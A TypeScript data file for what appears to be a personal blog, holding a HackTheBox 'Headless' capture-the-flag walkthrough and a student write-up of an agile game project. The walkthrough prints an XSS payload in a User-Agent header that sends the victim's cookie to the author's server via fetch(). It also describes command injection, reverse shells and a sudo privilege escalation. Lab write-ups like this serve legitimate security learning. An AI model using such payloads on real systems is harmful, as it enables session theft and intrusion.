//src /utils/blogPosts.ts

export interface BlogPost {
  title: string;
  date: string;
  content?: string; //? makes this property optional
  sections?: { title?: string; content?: string[] }[];
  link?: { text: string; href: string }[];
}

export const posts: BlogPost[] = [
  {
    title: "HackTheBox session, Headless(easy)",
    date: "01.07.2024",
    sections: [
      {
        title: "Discovery:",
        content: [
          "Found two open ports: 22 and 5000, where 5000 was a website.",
        ],
      },
      {
        title: "Enumeration",
        content: [
          "Found only two directories: /support(200) and /dashboard(401 Unauthorized)",
          "When looking at requests in Burpsuite, I found that the Cookie parameter contained Base64 description of the user type, followed by an authentication token. This turned out to be useful later.",
        ],
      },

      {
        title: "Exploiting XSS",
        content: [
          "Attempting xss on a form in /support resulted in a hack attempt warning. This warning read the HTTP headers from the sent request directly, which, ironically, was vulnerable to XSS.",
          "I set my User-Agent as follows: ",
          "User-Agent: </div><script> fetch('http://10.10.14.34:8000/?c=' + btoa(document.cookie));</script><div class=\"container\">",
          "By using fetch() I got the host to send a request to my python server, where the hosts cookie was included, giving me a admin session token.",
        ],
      },

      {
        title: "Gaining Initial Access",
        content: [
          "Using the retrieved session token, I gained access to the /dashboard, which didn't have a lot of functionality.",
          "I did some poking using Burpsuite, and found that appending linux commands on the data sent, allowed me to execute commands on the server.",
          "Using this, I set up a netcat listener and get a reverse shell on the server. I then found the flag by searching for user.txt using the find command.",
        ],
      },

      {
        title: "Privilege Escalation",
        content: [
          "Running sudo -l I found a single file that could be run as root without password; /usr/bin/syscheck",
          "Analysing this file, I found that is rad a shell file called initdb.sh, which I could edit. I therefore modified this file to include a reverse shell, and ran the syscheck file as root.",
          "The last step was to find the root flag, which I found by again using the find command.",
        ],
      },
    ],
    link: [
      {
        text: "Machine link",
        href: "https://app.hackthebox.com/machines/Headless",
      },
    ],
  },

  {
    title: "Obama Gaming: Our Agile Journey",
    date: "05.06.2024",
    sections: [
      {
        title: "Introduction",
        content: [
          "In the subject INF112 on UiB, we where tasked with developing a game. We assembled a team of developers, and brainstormed ideas for our project.",
        ],
      },
      {
        title: "Project approach:",
        content: [
          "We chose a Agile approach, and used tools such as Scrum and Kanban to organise the process.",
        ],
      },
      {
        title: "User stories",
        content: [
          "We had frequent Scrum meetings, where we disgussed our progression and planned new user stories. The user stories helped us to get a grasp on the functionality we wanted in our game. And laid foundation for or next tasks.",
        ],
      },
      {
        title: "Group dynamics",
        content: [
          "The team had good communication through Discord and physical meetings. We also went on a trip over the mountains in Bergen, which strengthened our ability to cooperate even more.",
        ],
      },
      {
        title: "Technical details",
        content: [
          "We used libGDX, which seemed to have fell out of date a while ago. A lot of the reference links where dead, but we managed.",
          "We tried do separate our project into a Model-View-Controller architecture to follow the STRONG principles. We focused on creating a modular code that allowed us to reused each others work.",
        ],
      },
      {
        title: "Conclusion",
        content: [
          "We had a great time working on this project, and we learned a lot about Agile development. We also learned a lot about the importance of good communication and cooperation in a team.",
        ],
      },
    ],
    link: [
      {
        text: "Project source code",
        href: "https://github.com/Yeetomeister/INF112-TowerDefense",
      },
    ],
  },
];
